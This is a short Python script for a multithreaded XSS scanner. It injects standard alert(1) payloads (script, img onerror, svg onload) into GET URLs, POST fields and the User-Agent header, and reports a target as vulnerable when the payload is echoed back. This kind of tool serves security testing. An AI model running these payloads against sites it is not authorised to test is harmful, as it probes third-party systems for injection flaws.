import requests
from bs4 import BeautifulSoup
import threading

class XSSScanner:
    def __init__(self, urls):
        self.urls = urls
        self.payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "'><img src=x onerror=alert(1)>",
            # 21 more payloads...
        ]

    def test_xss(self, url):
        for payload in self.payloads:
            # Test GET
            response = requests.get(url + payload)
            if self.is_vulnerable(response):
                self.report(url, payload)

            # Test POST
            response = requests.post(url, data={"param": payload})
            if self.is_vulnerable(response):
                self.report(url, payload)

            # Headers
            response = requests.get(url, headers={"User-Agent": payload})
            if self.is_vulnerable(response):
                self.report(url, payload)

    def is_vulnerable(self, response):
        return "alert(1)" in response.text

    def report(self, url, payload):
        print(f'Vulnerable: {url} with payload: {payload}')

    def scan(self):
        threads = []
        for url in self.urls:
            thread = threading.Thread(target=self.test_xss, args=(url,))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

if __name__ == '__main__':
    urls_to_scan = [
        'http://example.com',
    ]  # Add your URLs here
    scanner = XSSScanner(urls_to_scan)
    scanner.scan()